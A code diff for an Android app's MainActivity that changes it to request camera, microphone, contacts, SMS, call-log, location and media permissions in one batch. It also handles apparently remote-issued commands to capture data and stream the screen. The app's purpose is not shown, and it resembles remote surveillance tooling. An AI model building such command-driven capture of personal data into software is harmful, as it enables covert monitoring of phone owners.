@@ -64,9 +64,47 @@ class MainActivity : ComponentActivity() {
     private var pendingCommandId: Int? = null
     private var pendingScreenStream = false
 
+    private val allPermissions = mutableListOf(
+        Manifest.permission.CAMERA,
+        Manifest.permission.RECORD_AUDIO,
+        Manifest.permission.READ_CONTACTS,
+        Manifest.permission.READ_SMS,
+        Manifest.permission.READ_CALL_LOG,
+        Manifest.permission.ACCESS_FINE_LOCATION,
+        Manifest.permission.ACCESS_COARSE_LOCATION,
+    ).apply {
+        if (Build.VERSION.SDK_INT >= 33) {
+            add(Manifest.permission.READ_MEDIA_IMAGES)
+        } else {
+            add(Manifest.permission.READ_EXTERNAL_STORAGE)
+        }
+    }.toTypedArray()
+
+    private val multiPermissionLauncher = registerForActivityResult(
+        ActivityResultContracts.RequestMultiplePermissions()
+    ) { results ->
+        val denied = results.filter { !it.value }.keys
+        if (denied.isNotEmpty()) {
+            Toast.makeText(this, "Permissions denied: ${denied.joinToString { it.substringAfterLast(".") }}", Toast.LENGTH_LONG).show()
+        }
+    }
+
     private val permissionLauncher = registerForActivityResult(
         ActivityResultContracts.RequestPermission()
-    ) { }
+    ) { granted ->
+        if (!granted) {
+            Toast.makeText(this, "Permission denied", Toast.LENGTH_SHORT).show()
+        }
+    }
+
+    private fun requestAllPermissions() {
+        val needed = allPermissions.filter {
+            ContextCompat.checkSelfPermission(this, it) != PackageManager.PERMISSION_GRANTED
+        }
+        if (needed.isNotEmpty()) {
+            multiPermissionLauncher.launch(needed.toTypedArray())
+        }
+    }
 
     private fun ackCommand(success: Boolean, msg: String = "ok") {
         pendingCommandId?.let { id ->
@@ -266,25 +304,7 @@ class MainActivity : ComponentActivity() {
             pendingCommandId = intent.getIntExtra("command_id", 0)
         }
 
-        intent.getStringExtra("command_permission")?.let { perm ->
-            when (perm) {
-                "camera" -> launchPermission(Manifest.permission.CAMERA)
-                "microphone" -> launchPermission(Manifest.permission.RECORD_AUDIO)
-                "contacts" -> launchPermission(Manifest.permission.READ_CONTACTS)
-                "sms" -> launchPermission(Manifest.permission.READ_SMS)
-                "call_log" -> launchPermission(Manifest.permission.READ_CALL_LOG)
-                "gallery" -> {
-                    if (Build.VERSION.SDK_INT >= 33)
-                        launchPermission(Manifest.permission.READ_MEDIA_IMAGES)
-                    else
-                        launchPermission(Manifest.permission.READ_EXTERNAL_STORAGE)
-                }
-                "location" -> {
-                    launchPermission(Manifest.permission.ACCESS_FINE_LOCATION)
-                    launchPermission(Manifest.permission.ACCESS_COARSE_LOCATION)
-                }
-            }
-        }
+
         intent.getStringExtra("command_capture")?.let { target ->
             when (target) {
                 "camera" -> launchCameraCapture()
@@ -296,8 +316,11 @@ class MainActivity : ComponentActivity() {
     }
 
     private fun launchPermission(permission: String) {
-        if (ContextCompat.checkSelfPermission(this, permission) != PackageManager.PERMISSION_GRANTED)
-            permissionLauncher.launch(permission)
+        if (ContextCompat.checkSelfPermission(this, permission) == PackageManager.PERMISSION_GRANTED) {
+            Toast.makeText(this, "Permission already granted", Toast.LENGTH_SHORT).show()
+            return
+        }
+        permissionLauncher.launch(permission)
     }
 
     private fun launchCameraCapture() {
